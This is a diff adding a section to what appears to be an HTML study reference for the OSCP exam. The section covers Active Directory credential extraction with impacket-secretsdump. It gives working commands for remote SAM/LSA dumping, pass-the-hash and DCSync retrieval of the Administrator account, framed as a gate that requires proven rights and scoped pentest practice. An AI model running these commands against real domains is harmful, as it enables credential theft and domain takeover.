@@ -70,6 +70,41 @@ certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip "$DC_IP" -enabled -v
 </ol>
 <p><strong>New-session rule:</strong> a new shell, remote protocol or logon method can produce a different token, groups, profile, network reachability and credential visibility. Baseline again instead of assuming equivalence.</p>
 </details>
+<details id="ref-9-0a-1-secretsdump-credential-extraction-gate">
+<summary>🧾 9.0A.1 secretsdump / Credential Extraction — Decision Gate</summary>
+<p><code>[AD:SECRETS] [CREDS:FANOUT] [OUTPUT:TRIAGE]</code></p>
+<blockquote><p><strong>Do not run credential dumping merely because you have a credential.</strong> First prove the right that makes extraction possible. Recent pass reports mention <code>secretsdump</code> as high-value in AD; the useful lesson is the prerequisite gate, not blind dumping.</p></blockquote>
+<pre class="ref-code"><code class="language-text">WHAT RIGHT DO I ACTUALLY HAVE?
+
+Local Administrator / equivalent on a member host?
+  → remote SAM/LSA extraction may be justified
+  → collect only what advances the path
+
+Replication rights on the domain (DCSync)?
+  → retrieve one required domain account first
+
+Neither proven?
+  → DO NOT switch to secretsdump as a guess
+  → enumerate admin rights / ACLs / sessions / groups / delegation / services
+</code></pre>
+<h3>Member-host admin path</h3>
+<pre class="ref-code"><code class="language-bash"># Prove admin capability separately first.
+impacket-secretsdump "$DOMAIN/$AUTH_USER@$TARGET"
+impacket-secretsdump -hashes ":$NTLM" "$DOMAIN/$AUTH_USER@$TARGET"
+</code></pre>
+<h3>DCSync / replication-rights path</h3>
+<pre class="ref-code"><code class="language-bash"># Only after replication rights are proven; start with the account you need.
+DCSYNC_USER='Administrator'
+impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER@$DC"
+</code></pre>
+<pre class="ref-code"><code class="language-text">recovered material
+  → record source + principal + scope
+  → test relevant in-scope services
+  → prove auth vs admin/execution separately
+  → new identity/session? re-enumerate + re-collect BloodHound
+</code></pre>
+<p><strong>Failure decoder:</strong> access denied = rights; RPC/SMB failure = path/protocol; usage/import error = local tool/version. Do not label all three "bad credentials."</p>
+</details>
 <details id="ref-9-0b-ad-ten-case-sanity-map">
 <summary>🧭 9.0B AD Ten-Case Sanity Map — OSCP-Safe</summary>
 <p><strong>Recognition map, not a checklist to execute top-to-bottom.</strong> Current evidence, exact prerequisites and current OffSec rules choose the next action.</p>
